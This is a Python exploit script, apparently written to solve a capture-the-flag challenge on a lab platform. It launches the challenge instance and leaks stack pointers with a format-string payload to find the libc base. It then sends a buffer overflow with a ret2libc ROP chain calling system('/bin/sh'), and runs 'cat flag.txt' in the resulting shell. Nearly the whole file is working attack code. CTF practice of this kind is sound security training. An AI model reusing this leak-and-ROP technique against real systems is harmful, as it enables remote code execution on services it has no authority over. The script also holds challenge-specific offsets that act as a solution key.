import sys, re, time, socket, struct, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

POP_RDI, RET, SYSTEM, BINSH, LM = 0x2164f, 0x2139f, 0x4f420, 0x1b3d88, 0x21c87
cy = CyLab(delay=0.5)
cy.login()
cy.req("PUT", "/api/challenges/133/instance/?source=library")
host = port = None
for _ in range(10):
    st, b = cy.req("GET", "/api/challenges/133/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"nc\s+(-v\s+)?([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
    if m:
        host, port = m.group(2), int(m.group(3))
        break
    time.sleep(0.4)
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=12)
s.settimeout(2.0)
s.sendall(("%p." * 60).encode() + b"\n")
out = b""
quiet = 0
while quiet < 3:
    try:
        c = s.recv(16384)
        if not c:
            break
        out += c
        quiet = 0
    except socket.timeout:
        quiet += 1
vals = [int(v, 16) for v in re.findall(rb"0x[0-9a-f]+", out)]
print("valeurs lues:", len(vals))
base = None
for v in vals:
    if 0x7f0000000000 <= v <= 0x7fffffffffff and v % 0x1000 == 0xc87:
        base = v - LM
        break
if base is None:
    print("aucune valeur mod 0xc87 ; liste:")
    for i, v in enumerate(vals):
        if 0x700000000000 <= v:
            print("   %2d: 0x%x mod=0x%03x" % (i, v, v % 0x1000))
    sys.exit(1)
print("base libc: 0x%x | system: 0x%x" % (base, base + SYSTEM))
payload = b"A" * 0x70 + b"B" * 8 + struct.pack("<Q", base + POP_RDI) + \
    struct.pack("<Q", base + BINSH) + struct.pack("<Q", base + RET) + struct.pack("<Q", base + SYSTEM)
if b"\n" in payload:
    print("newline dans le payload, abandon")
    sys.exit(1)
s.sendall(payload + b"\n")
time.sleep(0.5)
s.sendall(b"cat flag.txt; ls; echo FIN\n")
res = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        res += c
        if b"FIN" in res:
            break
    except socket.timeout:
        break
s.close()
txt = res.decode("latin-1", "replace")
print("=== sortie ===")
print(txt[-400:])
m = re.search(r"\b[0-9a-f]{20,40}\b", txt)
print("CANDIDAT FLAG:", m.group(0) if m else None)
